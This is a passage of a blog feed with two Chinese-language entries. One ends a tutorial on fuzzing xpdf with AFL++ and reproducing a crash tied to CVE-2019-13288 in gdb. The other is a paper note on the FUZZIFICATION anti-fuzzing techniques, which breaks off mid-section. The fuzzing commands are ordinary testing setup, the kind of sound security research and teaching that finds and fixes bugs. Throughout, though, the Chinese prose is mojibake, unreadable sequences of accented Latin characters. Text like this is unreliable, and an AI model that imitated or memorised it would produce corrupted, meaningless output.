class="hljs-attribute">CXX</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast++ ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></div></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å°±å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤å¼€å§‹fuzzingäº†</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></div></td></tr></table></figure><p>å¯¹äºæ¯ä¸ªè¾“å…¥æ–‡ä»¶ï¼Œthe fuzzeréƒ½ä¼šæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p><p><code>$HOME/fuzzing_xpdf/install/bin/pdftotext &lt;input-file-name&gt; $HOME/fuzzing_xpdf/output</code></p><blockquote><p>å¦‚æœé‡åˆ°é”™è¯¯ <strong><em>â€œHmm, your system is configured to send core dump notifications to an external utilityâ€¦â€</em>,</strong></p><p>è¿™æ˜¯å› ä¸ºåœ¨æ‰§è¡Œ<code>afl-fuzz</code>å‰ï¼Œå¦‚æœç³»ç»Ÿé…ç½®ä¸ºå°†æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ï¼ˆcoreï¼‰é€šçŸ¥å‘é€åˆ°å¤–éƒ¨ç¨‹åºã€‚ å°†å¯¼è‡´å°†å´©æºƒä¿¡æ¯å‘é€åˆ°Fuzzerä¹‹é—´çš„å»¶è¿Ÿå¢å¤§ï¼Œè¿›è€Œå¯èƒ½å°†å´©æºƒè¢«è¯¯æŠ¥ä¸ºè¶…æ—¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—ä¸´æ—¶ä¿®æ”¹<code>core_pattern</code>æ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo su<br>echo core &gt;<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>core_pattern<br><span class="hljs-keyword">exit</span><br></code></pre></div></td></tr></table></figure></blockquote><p>æˆåŠŸå¼€å§‹fuzzingåæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„ç•Œé¢</p><p><img src="/posts/22ae87fa/image-20211201154932423.png" alt="image-20211201154932423"></p><p>ç­‰å¾…â€¦â€¦ä¸‰ä¸ªå¤šå°æ—¶åç»ˆäºå‡ºç°äº†ä¸€ä¸ªcrash</p><p><img src="/posts/22ae87fa/image-20211201201505518.png" alt="image-20211201201505518"></p><h2 id="crashå¤ç°"><a class="markdownIt-Anchor" href="#crashå¤ç°"></a> crashå¤ç°</h2><p>åœ¨$HOME/fuzzing_xpdf/out/æ–‡ä»¶å¤¹ä¸‹æˆ‘ä»¬å¯ä»¥æˆ‘ä»¬çš„crash</p><p><img src="/posts/22ae87fa/image-20211201201841167.png" alt="image-20211201201841167"></p><p>ç”¨è¿™ä¸ªcrashä½œä¸ºinputæ¥è¿›è¡Œå¤ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">/home/zino/fuzzing_xpdf/install/bin/pdftotext &#x27;/home/zino/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001820,time:12475087,op:havoc,rep:8&#x27; /home/zino/fuzzing_xpdf/output<br></code></pre></div></td></tr></table></figure><p><img src="/posts/22ae87fa/image-20211201202149422.png" alt="image-20211201202149422"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªcrashä¼šå¯¼è‡´æ®µé”™è¯¯å¹¶å¯¼è‡´ç¨‹åºå´©æºƒã€‚</p><p>æˆ‘ä»¬ç”¨gdbæ¥è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹ä¸€ä¸‹åŸå› </p><p>é¦–å…ˆéœ€è¦æ¸…é™¤åŸå…ˆçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‡æ–°æ„å»ºxpdfä»¥åŠ å…¥è°ƒè¯•ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">rm -r $HOME/fuzzing_xpdf/install<br>cd $HOME/fuzzing_xpdf/xpdf-3.02/<br>make clean<br>CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;<br>make<br>make install<br></code></pre></div></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥ç”¨GDBè°ƒè¯•äº†</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">gdb --args <span class="hljs-regexp">/home/</span>zino<span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-string">&#x27;/home/zino/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001820,time:12475087,op:havoc,rep:8&#x27;</span> <span class="hljs-regexp">/home/</span>zino<span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></div></td></tr></table></figure><p>é¦–å…ˆr</p><p>ç„¶åå¡ä½åæˆ‘ä»¬ç”¨bt(backtrace)å›æº¯</p><p>å¯ä»¥çœ‹åˆ°getObjå‡½æ•°è¢«åå¤é€’å½’è°ƒç”¨ï¼Œè¿™ä¸ªæ¼æ´è¢«è®°å½•ä¸º<a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p><p>åŸå› æ˜¯åœ¨ Xpdf 4.01.01 ä¸­ï¼Œ<a href="http://Parser.cc">Parser.cc</a> ä¸­çš„ Parser::getObj() å‡½æ•°å¯èƒ½ä¼šé€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„æ–‡ä»¶å¯¼è‡´æ— é™é€’å½’ã€‚è¿œç¨‹æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒè¿›è¡Œ DoS æ”»å‡»ã€‚</p><p><img src="/posts/22ae87fa/image-20211201203904689.png" alt="image-20211201203904689"></p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://paper.seebug.org/841/#1-afl-gcc">AFL æ¼æ´æŒ–æ˜æŠ€æœ¯æ¼«è°ˆï¼ˆä¸€ï¼‰ï¼šç”¨ AFL å¼€å§‹ä½ çš„ç¬¬ä¸€æ¬¡ Fuzzing</a></p><p><a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201">fuzzing101-exercise1</a></p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®ºæ–‡ç¬”è®°ï¼šã€ŠFUZZIFICATION:Anti-Fuzzing Techniquesã€‹</title>
    <link href="/posts/5dd98acd/"/>
    <url>/posts/5dd98acd/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸€-å‰è¨€"><a class="markdownIt-Anchor" href="#ä¸€-å‰è¨€"></a> ä¸€ã€å‰è¨€</h2><p>Fuzzingæ˜¯ä¸€ç§è½¯ä»¶æµ‹è¯•æŠ€æœ¯ï¼Œå®ƒå¯ä»¥åœ¨ä¸äº†è§£ç¨‹åºå†…éƒ¨ç»“æ„çš„æƒ…å†µä¸‹å¿«é€Ÿã€è‡ªåŠ¨åœ°æ¢ç´¢ç¨‹åºçš„è¾“å…¥ç©ºé—´ã€‚</p><p>å®ƒå³æ–¹ä¾¿äº†æµ‹è¯•äººå‘˜æ£€æµ‹æ¼æ´ï¼Œä½†è¿™æ„å‘³ç€ä¹Ÿå¯ä»¥è¢«æ¶æ„æ”»å‡»è€…ä½¿ç”¨ä»¥å‘ç°0dayæ¼æ´ã€‚</p><p>å› æ­¤ï¼Œå¼€å‘äººå‘˜å¸Œæœ›åœ¨å…¶äº§å“ä¸Šåº”ç”¨åæ¨¡ç³ŠæŠ€æœ¯ä»¥é˜»æ­¢æ”»å‡»è€…è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œå…¶æ¦‚å¿µç±»ä¼¼äºä½¿ç”¨æ··æ·†æŠ€æœ¯å‰Šå¼±é€†å‘å·¥ç¨‹ã€‚</p><p>åœ¨æœ¬æ–‡ä¸­ï¼Œä½œè€…æå‡ºäº†ä¸€ç§äºŒè¿›åˆ¶ä¿æŠ¤çš„æ–°æ–¹å‘ï¼Œç§°ä¸ºFUZZIFICATIONã€‚æ”»å‡»è€…ä»ç„¶å¯ä»¥ä»å—FUZZIFICATIONä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾é”™è¯¯ï¼Œä½†<strong>éœ€è¦èŠ±è´¹æ›´å¤šçš„ç²¾åŠ›</strong>ï¼ˆä¾‹å¦‚ï¼ŒCPUï¼Œå†…å­˜å’Œæ—¶é—´ï¼‰ã€‚å› æ­¤ï¼Œè·å¾—åŸå§‹äºŒè¿›åˆ¶æ–‡ä»¶çš„å¼€å‘äººå‘˜æˆ–å…¶ä»–å—ä¿¡ä»»æ–¹èƒ½å¤Ÿåœ¨æ”»å‡»è€…ä¹‹å‰æ£€æµ‹ç¨‹åºé”™è¯¯å¹¶åˆæˆè¡¥ä¸ã€‚</p><h2 id="äºŒ-fuzzificationç®€ä»‹"><a class="markdownIt-Anchor" href="#äºŒ-fuzzificationç®€ä»‹"></a> äºŒã€Fuzzificationç®€ä»‹</h2><p><code>Fuzzification</code>å¸®åŠ©å¼€å‘äººå‘˜ä¿æŠ¤å·²å‘å¸ƒçš„çº¯äºŒè¿›åˆ¶è½¯ä»¶èƒ½å¤Ÿå…å—åº”ç”¨æœ€å…ˆè¿›æ¨¡ç³ŠæŠ€æœ¯çš„æ”»å‡»è€…çš„ä¾µå®³ã€‚åœ¨ç»™å®šæ€§èƒ½é¢„ç®—çš„æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹æ³•æ—¨åœ¨å°½å¯èƒ½åœ°é˜»æ­¢å¯¹æ‰‹çš„æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ã€‚</p><p><a href="https://www.usenix.org/system/files/sec19fall_jung_prepub.pdf">è®ºæ–‡ã€ŠFUZZIFICATION: Anti-Fuzzing Techniquesã€‹pdfä¸‹è½½</a></p><p><a href="https://github.com/sslab-gatech/fuzzification">githubåœ°å€</a></p><h3 id="æŠ€æœ¯ç»„ä»¶"><a class="markdownIt-Anchor" href="#æŠ€æœ¯ç»„ä»¶"></a> æŠ€æœ¯ç»„ä»¶</h3><p>å…¶ç›®å‰åŒ…æ‹¬ä¸‰ä¸ªæŠ€æœ¯ç»„ä»¶ï¼š</p><ul><li><strong>SpeedBump</strong>ï¼šå°†æ­£å¸¸æ‰§è¡Œçš„å‡é€Ÿæ”¾å¤§æ•°ç™¾å€åˆ°æ¨¡ç³Šæ‰§è¡Œï¼Œä»è€Œé™ä½fuzzingæ•ˆç‡ã€‚<ul><li>æ³¨å…¥<strong>å»¶è¿Ÿ</strong>åˆ°æ­£å¸¸æ‰§è¡Œå¾ˆå°‘åˆ°è¾¾ï¼Œä½†æ¨¡ç³Šæ‰§è¡Œç»å¸¸è®¿é—®çš„å†·è·¯å¾„ã€‚</li></ul></li><li><strong>BranchTrap</strong>ï¼šé€šè¿‡éšè—è·¯å¾„å’Œæ±¡æŸ“è¦†ç›–å›¾æ¥å¹²æ‰°åé¦ˆé€»è¾‘ã€‚<ul><li>åœ¨ç¨‹åºä¸­æ’å…¥å¤§é‡å¯¹è¾“å…¥æ•æ„Ÿçš„è·³è½¬ï¼Œå› æ­¤ä»»ä½•è¾“å…¥å˜åŒ–éƒ½ä¼šæ˜¾è‘—åœ°æ”¹å˜æ‰§è¡Œè·¯å¾„ã€‚è¿™å°†ä¿ƒä½¿åŸºäºè¦†ç›–ç‡åé¦ˆçš„fuzzingå·¥å…·å°†ç²¾åŠ›èŠ±åœ¨æ³¨å…¥çš„æ— bugè·¯å¾„ä¸Šï¼Œè€Œä¸æ˜¯çœŸæ­£çš„è·¯å¾„ä¸Šã€‚</li></ul></li><li><strong>AntiHybrid</strong>ï¼šé˜»ç¢æ±¡ç‚¹åˆ†æå’Œç¬¦å·æ‰§è¡Œã€‚<ul><li>åæ··åˆæŠ€æœ¯çš„ç›®çš„æ˜¯é˜»æ­¢å°†ä¼ ç»Ÿçš„æ¨¡ç³Šæ–¹æ³•ä¸åŠ¨æ€æ±¡æŸ“åˆ†æå’Œç¬¦å·æ‰§è¡Œç›¸ç»“åˆçš„æ··åˆæ¨¡ç³Šæ–¹æ³•ã€‚</li></ul></li></ul><p>æ¯ä¸€ç§æŠ€æœ¯éƒ½è®¾è®¡äº†æœ‰æ•ˆçš„é˜²å¾¡æªæ–½ï¼Œè¯•å›¾é˜»æ­¢æ•Œäººç»•è¿‡FUZZIFICATIONã€‚</p><h3 id="åº”ç”¨æµç¨‹"><a class="markdownIt-Anchor" href="#åº”ç”¨æµç¨‹"></a> åº”ç”¨æµç¨‹</h3><p><img src="/posts/5dd98acd/image-20211202105624895.png" alt="image-20211202105624895"></p><p>å¼€å‘äººå‘˜ä½¿ç”¨FUZZIFICATIONæŠ€æœ¯åˆ›å»ºä¸€ä¸ªå—ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶å¹¶å°†å…¶å‘å¸ƒç»™å…¬ä¼—ã€‚åŒæ—¶ï¼Œå®ƒä»¬å°†æ­£å¸¸ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶å‘é€ç»™å—ä¿¡ä»»çš„ä¸€æ–¹ã€‚æ”»å‡»è€…æ— æ³•é€šè¿‡fuzzingä»å—ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°å¾ˆå¤šbugï¼Œè€Œå—ä¿¡ä»»çš„ä¸€æ–¹å¯ä»¥æœ‰æ•ˆåœ°å‘ç°æ›´å¤šçš„bugï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜å¯ä»¥åŠæ—¶ä¿®è¡¥å®ƒä»¬ã€‚</p><h2 id="ä¸‰-è®¾è®¡æ¦‚è¿°"><a class="markdownIt-Anchor" href="#ä¸‰-è®¾è®¡æ¦‚è¿°"></a> ä¸‰ã€è®¾è®¡æ¦‚è¿°</h2><p><img src="/posts/5dd98acd/image-20211202110549083.png" alt="fuzzificationå·¥ä½œæµç¨‹çš„æ¦‚è¿°"></p><ul><li><p>å®ƒå°†<strong>ç¨‹åºæºä»£ç </strong>ã€<strong>ä¸€ç»„å¸¸ç”¨çš„æµ‹è¯•ç”¨ä¾‹</strong>å’Œ<strong>å¼€é”€é¢„ç®—</strong>ä½œä¸ºè¾“å…¥ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªç”±fuzzificationæŠ€æœ¯ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><blockquote><p>è¯·æ³¨æ„ï¼Œfuzzificationä¾èµ–äºå¼€å‘äººå‘˜ç¡®å®šé€‚å½“çš„å¼€é”€é¢„ç®—ï¼Œè¿™éœ€è¦åœ¨äº§å“çš„åŠŸèƒ½å’Œå®‰å…¨æ€§ä¹‹é—´å–ä¸€ä¸ªå¹³è¡¡ã€‚</p></blockquote></li></ul><ol><li><p>æˆ‘ä»¬ç¼–è¯‘ç¨‹åºæ¥ç”Ÿæˆä¸€ä¸ªæ­£å¸¸çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ç”¨ç»™å®šçš„æ­£å¸¸æµ‹è¯•ç”¨ä¾‹æ¥è¿è¡Œå®ƒæ¥æ”¶é›†åŸºæœ¬çš„å—é¢‘ç‡ã€‚é¢‘ç‡ä¿¡æ¯å‘Šè¯‰æˆ‘ä»¬å“ªäº›åŸºæœ¬å—å¾ˆå°‘è¢«æ­£å¸¸çš„æ‰§è¡Œä½¿ç”¨ã€‚</p></li><li><p>è¿™ä¸ªæ¦‚è¦æ–‡ä»¶çš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å°†ä¸‰ç§fuzzificationæŠ€æœ¯åº”ç”¨åˆ°ç¨‹åºä¸­ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªä¸´æ—¶çš„å—ä¿æŠ¤äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p></li><li><p>æˆ‘ä»¬å†æ¬¡ç”¨ç»™å®šçš„æ­£å¸¸æµ‹è¯•ç”¨ä¾‹æ¥æµ‹é‡ä¸´æ—¶äºŒè¿›åˆ¶æ–‡ä»¶çš„å¼€é”€ã€‚å¦‚æœå¼€é”€è¶…è¿‡äº†å¼€é”€é¢„ç®—ï¼Œæˆ‘ä»¬è¿”å›åˆ°<strong>æ­¥éª¤2</strong>ï¼Œä»¥å‡å°‘ç¨‹åºçš„é€Ÿåº¦é™ä½ç¨‹åº¦ï¼Œä¾‹å¦‚ä½¿ç”¨æ›´çŸ­çš„å»¶è¿Ÿå’Œæ·»åŠ æ›´å°‘çš„ä»ªå™¨ã€‚å¦‚æœå¼€é”€è¿œä½äºé¢„ç®—ï¼Œæˆ‘ä»¬å°±ç›¸åº”åœ°å¢åŠ å¼€é”€ã€‚</p></li><li><p>å¦åˆ™ï¼Œæˆ‘ä»¬ç”Ÿæˆå—ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p></li></ol><h3 id="speedbump"><a class="markdownIt-Anchor" href="#speedbump"></a> SpeedBump</h3><p><strong>åŠŸèƒ½ï¼šå‡ç¼“fuzzingçš„é€Ÿåº¦ï¼ŒåŒæ—¶æœ€å°åŒ–å¯¹æ­£å¸¸æ‰§è¡Œçš„å½±å“ã€‚</strong></p><blockquote><p>æ¨¡ç³Šæ‰§è¡Œè¿‡ç¨‹ä¸­ç»å¸¸é™·å…¥æ­£å¸¸æ‰§è¡Œå¾ˆå°‘è®¿é—®çš„è·¯å¾„ï¼Œä¾‹å¦‚wrong MAGICç­‰è·¯å¾„ã€‚æˆ‘ä»¬ç§°ä¹‹ä¸ºå†·è·¯å¾„ã€‚</p></blockquote><p>åœ¨<strong>å†·è·¯å¾„</strong>ä¸­æ³¨å…¥<strong>å»¶è¿Ÿ</strong>å°†æ˜¾è‘—é™ä½æ¨¡ç³Šæ‰§è¡Œçš„é€Ÿåº¦ï¼Œä½†ä¸ä¼šå¯¹å¸¸è§„æ‰§è¡Œäº§ç”Ÿå¤ªå¤§å½±å“ã€‚è¯¥æ–‡é¦–å…ˆç”¨ç»™å®šçš„æµ‹è¯•ç”¨ä¾‹ä»æ­£å¸¸æ‰§è¡Œä¸­è¯†åˆ«å†·è·¯å¾„ï¼Œç„¶åå°†ç²¾å¿ƒè®¾è®¡çš„å»¶è¿Ÿæ³¨å…¥åˆ°æœ€å°‘æ‰§è¡Œçš„ä»£ç è·¯å¾„ä¸­ï¼Œfuzzificationä¼šè‡ªåŠ¨ç¡®å®šæ³¨å…¥å»¶è¿Ÿçš„ä»£ç è·¯å¾„æ•°é‡å’Œæ¯ä¸ªå»¶è¿Ÿçš„é•¿åº¦ï¼Œä»¥ä¾¿åœ¨æ­£å¸¸æ‰§è¡ŒæœŸé—´ï¼Œå—ä¿æŠ¤çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„å¼€é”€æ»¡è¶³ç”¨æˆ·å®šä¹‰çš„å¼€é”€é¢„ç®—ã€‚</p><h4 id="1-åŸºæœ¬å—é¢‘ç‡åˆ†æ"><a class="markdownIt-Anchor" href="#1-åŸºæœ¬å—é¢‘ç‡åˆ†æ"></a> 1. åŸºæœ¬å—é¢‘ç‡åˆ†æ</h4><p>fuzzificationç”Ÿæˆä¸€ä¸ªåŸºæœ¬å—é¢‘ç‡åˆ†ææ¦‚è¦æ¥è¯†åˆ«å†·è·¯å¾„ã€‚</p><p>åˆ†æè¿‡ç¨‹éµå¾ªä¸‰ä¸ªæ­¥éª¤ã€‚</p><ul><li>é¦–å…ˆï¼Œæˆ‘ä»¬æ£€æµ‹ç›®æ ‡ç¨‹åºæ¥è®¡ç®—åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è®¿é—®çš„åŸºæœ¬å—ï¼Œå¹¶ç”Ÿæˆç”¨äºåˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li><li>å…¶æ¬¡ï¼Œä½¿ç”¨ç”¨æˆ·æä¾›çš„æµ‹è¯•ç”¨ä¾‹ï¼Œæˆ‘ä»¬è¿è¡Œè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å¹¶æ”¶é›†æ¯ä¸ªè¾“å…¥è®¿é—®çš„åŸºæœ¬å—ã€‚</li><li>ç¬¬ä¸‰ï¼ŒFUZZIFICATIONå¯¹æ”¶é›†åˆ°çš„ä¿¡æ¯è¿›è¡Œåˆ†æï¼Œä»¥è¯†åˆ«æœ‰æ•ˆè¾“å…¥å¾ˆå°‘æ‰§è¡Œæˆ–ä»æœªæ‰§è¡Œçš„åŸºæœ¬å—ã€‚è¿™äº›å—åœ¨å»¶è¿Ÿæ³¨å…¥ä¸­è¢«è§†ä¸ºå†·è·¯å¾„ã€‚</li></ul><h4 id="2-å¯é…ç½®çš„å»¶è¿Ÿæ³¨å…¥"><a class="markdownIt-Anchor" href="#2-å¯é…ç½®çš„å»¶è¿Ÿæ³¨å…¥"></a> 2. å¯é…ç½®çš„å»¶è¿Ÿæ³¨å…¥</h4><p>é‡å¤æ‰§è¡Œä»¥ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼Œä»¥ç¡®å®šè¦<strong>æ³¨å…¥å»¶è¿Ÿ</strong>çš„ä»£ç å—å’Œ<strong>æ¯ä¸ªå»¶è¿Ÿçš„é•¿åº¦</strong>:</p><ul><li>é¦–å…ˆåœ¨æµ‹è¯•æ‰§è¡Œä¸­æ³¨å…¥30msçš„å»¶è¿Ÿåˆ°æœ€å°‘æ‰§è¡Œçš„åŸºæœ¬å—çš„3%ã€‚è¯¥æ–‡ä½œè€…å‘ç°è¿™ä¸ªè®¾ç½®éå¸¸æ¥è¿‘æœ€ç»ˆçš„è¯„ä¼°ç»“æœã€‚</li><li>æµ‹é‡ç”Ÿæˆçš„äºŒè¿›åˆ¶ä»£ç çš„å¼€é”€ã€‚å¦‚æœå®ƒæ²¡æœ‰è¶…è¿‡ç”¨æˆ·å®šä¹‰çš„å¼€é”€é¢„ç®—ï¼Œæˆ‘ä»¬å°±è¿›å…¥ä¸Šä¸€æ­¥ï¼Œå°†æ›´å¤šçš„å»¶è¿Ÿæ³¨å…¥åˆ°æ›´å¤šçš„åŸºæœ¬å—ä¸­ã€‚å¦åˆ™ï¼Œæˆ‘ä»¬ä½¿ç”¨å‰ä¸€è½®çš„å»¶è¿Ÿä½œä¸ºæœ€ç»ˆç»“æœã€‚æˆ‘ä»¬çš„speedbumptechnicalæ˜¯ç‰¹åˆ«æœ‰ç”¨çš„å¼€å‘äººå‘˜ä¸€èˆ¬æœ‰ä¸€ä¸ªå¾ˆå¥½çš„ç†è§£ä»–ä»¬çš„åº”ç”¨ç¨‹åºï¼Œä»¥åŠå¯¹fuzzificationçš„è¦æ±‚ã€‚</li></ul><p>ä½œè€…æä¾›äº†5ä¸ªé€‰é¡¹ï¼Œå¼€å‘è€…å¯ä»¥ä½¿ç”¨å®ƒä»¬æ¥å¾®è°ƒSpeedBumpçš„æ•ˆæœã€‚</p><ul><li><code>MAX_OVERHEAD</code>å®šä¹‰äº†å¼€é”€é¢„ç®—ã€‚å¼€å‘äººå‘˜å¯ä»¥æŒ‡å®šä»»ä½•å€¼ï¼Œåªè¦ä»–ä»¬å¯¹å¼€é”€æ„Ÿåˆ°æ»¡æ„ã€‚</li><li><code>DELAY_LENGTH</code>æŒ‡å®šå»¶è¿Ÿçš„èŒƒå›´ã€‚</li><li><code>INCLUDE_INCORRECT</code>å†³å®šæ˜¯å¦å°†å»¶è¿Ÿæ³¨å…¥é”™è¯¯å¤„ç†åŸºæœ¬å—(å³ï¼Œåªæœ‰æ— æ•ˆè¾“å…¥æ‰§è¡Œçš„ä½ç½®)ï¼Œè¿™æ˜¯é»˜è®¤å¯ç”¨çš„ã€‚</li><li><code>INCLUDE_NON_EXEC</code> and <code>NON_EXEC_RATIO</code>æŒ‡å®šæ˜¯å¦æ³¨å…¥å»¶è¿Ÿåˆ°æœ‰å¤šå°‘åŸºæœ¬å—åœ¨æµ‹è¯•æ‰§è¡Œè¿‡ç¨‹ä¸­ä»æœªæ‰§è¡Œã€‚å½“å¼€å‘äººå‘˜æ²¡æœ‰å¤§é‡çš„æµ‹è¯•ç”¨ä¾‹æ—¶ï¼Œè¿™å¾ˆæœ‰ç”¨ã€‚</li></ul><h4 id="3-æŠ—åˆ†æå»¶è¿ŸåŸè¯­"><a class="markdownIt-Anchor" href="#3-æŠ—åˆ†æå»¶è¿ŸåŸè¯­"></a> 3. æŠ—åˆ†æå»¶è¿ŸåŸè¯­</h4><p>ç”±äºæ”»å‡»è€…å¯èƒ½ä½¿ç”¨ç¨‹åºåˆ†ææ¥è¯†åˆ«å’Œåˆ é™¤ç®€å•çš„å»¶è¿ŸåŸè¯­(ä¾‹å¦‚ï¼Œsleep)ï¼Œä½œè€…è®¾è®¡äº†åŒ…å«ç®—æœ¯æ“ä½œå¹¶ä¸åŸå§‹ä»£ç åº“ç›¸è”ç³»çš„å¥å£®åŸè¯­ã€‚</p><p>ä½œè€…è®¾è®¡çš„åŸè¯­æ˜¯åŸºäºcsmithçš„ï¼Œ<strong>å®ƒå¯ä»¥ç”Ÿæˆéšæœºçš„ã€æ— bugçš„ä»£ç ç‰‡æ®µ</strong>ã€‚ä¾‹å¦‚ï¼ŒCSmithå¯ä»¥ç”Ÿæˆä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥å—å‚æ•°ï¼Œæ‰§è¡Œç®—æœ¯æ“ä½œï¼Œå¹¶è¿”å›ç‰¹å®šç±»å‹çš„å€¼ã€‚ä¿®æ”¹äº†csmithä½¿å…¶ç”Ÿæˆçš„ä»£ç å…·æœ‰å¯¹åŸå§‹ä»£ç çš„æ•°æ®ä¾èµ–å’Œä»£ç ä¾èµ–ã€‚å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯å°†åŸå§‹ä»£ç ä¸­çš„ä¸€ä¸ªå˜é‡ä½œä¸ºå‚æ•°ä¼ é€’ç»™ç”Ÿæˆçš„ä»£ç ï¼Œä»ç”Ÿæˆçš„ä»£ç ä¸­å¼•ç”¨åŸå§‹ä»£ç ï¼Œå¹¶ä½¿ç”¨è¿”å›å€¼ä¿®æ”¹åŸå§‹ä»£ç çš„ä¸€ä¸ªå…¨å±€å˜é‡ã€‚</p><p>å›¾5æ˜¾ç¤ºäº†å»¶è¿ŸåŸè¯­çš„ä¸€ä¸ªç¤ºä¾‹ã€‚å®ƒå£°æ˜äº†ä¸€ä¸ªå±€éƒ¨å˜é‡pass_varå’Œå¹¶ä¿®æ”¹å…¨å±€å˜é‡global_var1å’Œglobal_var2ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œä½œè€…å¼•å…¥äº†åŸå§‹ä»£ç å’Œæ³¨å…¥ä»£ç (ç¬¬6ã€9å’Œ12è¡Œ)ä¹‹é—´çš„æ•°æ®æµä¾èµ–å…³ç³»ï¼Œå¹¶åœ¨ä¸å½±å“åŸå§‹ç¨‹åºçš„æƒ…å†µä¸‹æ›´æ”¹ç¨‹åºçŠ¶æ€ã€‚å°½ç®¡ä»£ç æ˜¯éšæœºç”Ÿæˆçš„ï¼Œä½†å®ƒé€šè¿‡æ•°æ®æµå’Œæ§åˆ¶æµä¾èµ–å…³ç³»ä¸åŸå§‹ä»£ç ç´§å¯†è€¦åˆã€‚</p><p><img src="/posts/5dd98acd/image-20211202205833884.png" alt="image-20211202205833884"></p><h3 id="branchtrap"><a class="markdownIt-Anchor" href="#branchtrap"></a> BranchTrap</h3><p><strong>åŠŸèƒ½ï¼šé€šè¿‡éšè—è·¯å¾„å’Œæ±¡æŸ“è¦†ç›–å›¾æ¥å¹²æ‰°åé¦ˆé€»è¾‘</strong></p><p>ä»£ç 